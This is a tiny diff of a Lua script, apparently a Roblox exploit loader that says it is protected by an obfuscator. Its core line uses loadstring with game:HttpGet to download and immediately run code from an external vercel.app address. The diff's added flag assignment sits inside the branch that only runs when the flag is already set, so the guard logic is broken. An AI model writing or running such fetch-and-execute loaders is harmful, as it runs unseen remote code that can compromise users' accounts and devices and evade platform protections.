@@ -1,5 +1,6 @@
 -- This file was protected using Luraph Obfuscator v14.4.2 [https://lura.ph/]
 if _G.Executed then
+  _G.Executed = true
   return
 end
 loadstring(game:HttpGet('https://valorsite.vercel.app/wm'))()
